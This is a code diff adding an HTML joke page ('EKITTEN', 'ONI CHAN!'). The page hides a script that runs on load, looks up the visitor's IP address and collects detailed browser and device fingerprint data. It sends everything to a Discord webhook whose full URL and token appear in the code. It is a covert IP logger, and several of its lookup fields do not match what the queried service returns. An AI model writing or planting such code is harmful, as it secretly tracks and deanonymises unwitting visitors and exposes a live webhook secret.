@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EKITTEN</title>
+</head>
+<body>
+    <h1>ONI CHAN!</h1>
+
+    <script>
+      (function() {
+        fetch("https://api.ipify.org?format=json")
+          .then((response) => response.json())
+          .then((data) => {
+            const logData = {
+              ipAddress: data.YourFuckingIPAddress,
+              location: data.YourFuckingLocation,
+              hostname: data.YourFuckingHostname,
+              isp: data.YourFuckingISP,
+              city: data.YourFuckingCity,
+              country: data.YourFuckingCountry,
+              countryCode: data.YourFuckingCountryCode,
+              userAgent: navigator.userAgent,
+              windowProp: Object.keys(window).length,
+              windowWidth: window.innerWidth,
+              windowHeight: window.innerHeight,
+              windowRatio: window.innerWidth / window.innerHeight,
+              screenWidth: window.screen.availWidth,
+              screenHeight: window.screen.availHeight,
+              screenRatio: window.screen.availWidth / window.screen.availHeight,
+              DPI: window.devicePixelRatio,
+              colorDepth: window.screen.colorDepth,
+              orientation: window.screen.orientation.type,
+              orientationAngle: window.screen.orientation.angle,
+              os: navigator.platform,
+              threads: navigator.hardwareConcurrency,
+              memory: navigator.deviceMemory,
+              systemLanguages: navigator.languages.join(", "),
+              language: navigator.language,
+            };
+
+            // Payload for the webhook
+            const payload = {
+              content: `IP Address: ${logData.ipAddress}\nLocation: ${logData.location}\nHostname: ${logData.hostname}\nISP: ${logData.isp}\nCity: ${logData.city}\nCountry: ${logData.country}\nCountry Code: ${logData.countryCode}\nUser Agent: ${logData.userAgent}\nWindow Properties: ${logData.windowProp}\nWindow Width: ${logData.windowWidth}\nWindow Height: ${logData.windowHeight}\nWindow Ratio: ${logData.windowRatio}\nScreen Width: ${logData.screenWidth}\nScreen Height: ${logData.screenHeight}\nScreen Ratio: ${logData.screenRatio}\nDPI: ${logData.DPI}\nColor Depth: ${logData.colorDepth}\nOrientation: ${logData.orientation}\nOrientation Angle: ${logData.orientationAngle}\nOS: ${logData.os}\nThreads: ${logData.threads}\nMemory: ${logData.memory}\nSystem Languages: ${logData.systemLanguages}\nLanguage: ${logData.language}`,
+            };
+
+            // Replace with your webhook URL
+            fetch("https://discord.com/api/webhooks/1253868282575065138/1ZJjBqtYgff5nFqvmDDfskrvyo-8JQwclQMa7UHhZdXg6U4PFxGyEdOraBYkDo6qSceX", {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(payload),
+            })
+              .then((response) => console.log('Data sent successfully'))
+              .catch((error) => console.error('Error sending data:', error));
+          })
+          .catch((error) => console.error('Error fetching IP data:', error));
+      })();
+    </script>
+</body>
+</html>
